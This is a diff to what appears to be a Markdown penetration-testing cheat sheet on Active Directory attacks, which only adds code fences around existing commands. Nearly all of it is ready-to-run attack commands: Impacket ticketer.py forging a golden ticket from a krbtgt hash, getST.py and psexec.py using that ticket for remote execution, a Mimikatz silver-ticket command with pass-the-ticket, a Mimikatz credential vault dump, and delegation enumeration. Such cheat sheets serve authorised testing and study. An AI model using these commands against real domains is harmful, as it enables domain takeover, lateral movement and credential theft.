@@ -223,21 +223,23 @@ Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"' (credentials li
 # Golden & Silver Ticket
   
 ### With ticketer
-
+```
 ticketer.py -nthash <krbtgthash> -domain-sid <sid> -user-id 500 -domain <domain> <user>
-
+```
+```
 getST.py -k -no-pass -dc-ip <IP> -spn cifs/<FQDNMachine> <domain>/<user>
-
+```
+```
 psexec.py -k -no-pass -dc-ip <IP> <domain>/<user>@<FQDNMachine>
-
+```
 ### With Mimikatz
-
+```
 Invoke-Mimikatz -Command '"kerberos::golden /domain:<..> /sid:<..> /target:<FQDN> /service:HOST /rc4:<hash> /user:Administrator /ptt'" (silver)
-
+```
 # Enum Delegation
-
+```
 python3 findDelegation.py <domain>/<user>:<pass> -dc-ip <ip>
-
+```
 # BloodHound
 
 coming ...
